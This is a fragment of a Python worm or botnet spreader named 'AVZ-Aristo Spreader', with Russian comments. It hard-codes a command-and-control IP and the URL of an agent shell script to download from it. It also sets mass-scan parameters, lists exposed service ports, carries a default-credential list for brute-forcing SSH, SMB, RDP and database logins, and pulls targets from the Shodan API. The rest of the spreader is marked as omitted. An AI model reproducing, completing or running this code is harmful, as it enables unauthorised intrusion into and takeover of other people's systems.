#!/usr/bin/env python3
# AVZ-Aristo Spreader v25.15 – Shodan API, XOR-агент
import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests, base64

if sys.platform != 'win32':
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except:
        pass

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

C2_HOST = "80.249.146.202"
C2_PORT = 80
API_PORT = 8080
AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
MAX_CONCURRENT = 800
QUICK_TIMEOUT = 2.0
BRUTE_TIMEOUT = 2.5
DEFAULT_SCAN_COUNT = 20_000
SHODAN_API_KEY = os.environ.get("SHODAN_KEY", "")  # Вставьте свой ключ
PORT_LIST = [21, 22, 23, 80, 443, 1433, 3306, 3389, 445, 5432, 5900, 5985, 6379, 8080, 9200]

CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"),
    ("admin","admin"), ("admin","password"), ("admin","123456"),
    ("sa",""), ("sa","sa"), ("sa","password"), ("sa","123456"),
    ("postgres","postgres"), ("postgres","password"), ("postgres","123456")
]

# ... (весь остальной код спредера без изменений, только добавлена функция получения целей из Shodan)

def fetch_shodan_ips(query="port:22,445,3389"):
    if not SHODAN_API_KEY:
        return []
    try:
        resp = requests.get(f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query={query}&limit=100", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return [match['ip_str'] for match in data.get('matches', [])]
    except:
        pass
    return []

# В main_async добавлен вызов fetch_shodan_ips при старте, если указан --shodan
